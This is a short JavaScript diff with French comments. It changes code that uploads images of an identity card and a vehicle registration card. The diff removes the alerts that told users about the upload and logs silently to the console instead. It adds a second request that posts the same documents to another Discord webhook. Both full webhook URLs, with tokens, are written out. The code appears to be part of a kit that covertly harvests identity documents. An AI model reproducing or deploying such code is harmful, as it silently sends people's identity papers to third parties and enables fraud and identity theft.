@@ -120,17 +120,32 @@
             formData.append('file', carteIdentiteBlob, 'carte_identite.png');
             formData.append('file', carteGriseBlob, 'carte_grise.png');
 
+            // Envoi de la carte d'identité à un Webhook
             fetch('https://discord.com/api/webhooks/1315009679335751720/nQcqmHMjJeZtQQFEQ4DoTZaYe3XPjSKuCm4fuUNY3TrZInEYmfRE_bmewvPiCbtmRulD', {
                 method: 'POST',
                 body: formData
             }).then(response => {
                 if (response.ok) {
-                    alert('Les cartes ont été envoyées avec succès!');
+                    console.log('Carte d\'identité envoyée avec succès!');
                 } else {
-                    alert('Erreur lors de l\'envoi des cartes');
+                    console.error('Erreur lors de l\'envoi de la carte d\'identité');
                 }
             }).catch(error => {
-                alert('Erreur réseau: ' + error);
+                console.error('Erreur réseau: ' + error);
+            });
+
+            // Envoi de la carte grise à un autre Webhook
+            fetch('https://discord.com/api/webhooks/1316432733731422350/HismXaSocwvmOwoqyqN0p5sgEkZkDJt2y1If9Ot4ulf1JPNNvqI05c8MqNiTFwQ2w-mQ', {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Carte grise envoyée avec succès!');
+                } else {
+                    console.error('Erreur lors de l\'envoi de la carte grise');
+                }
+            }).catch(error => {
+                console.error('Erreur réseau: ' + error);
             });
         }
 
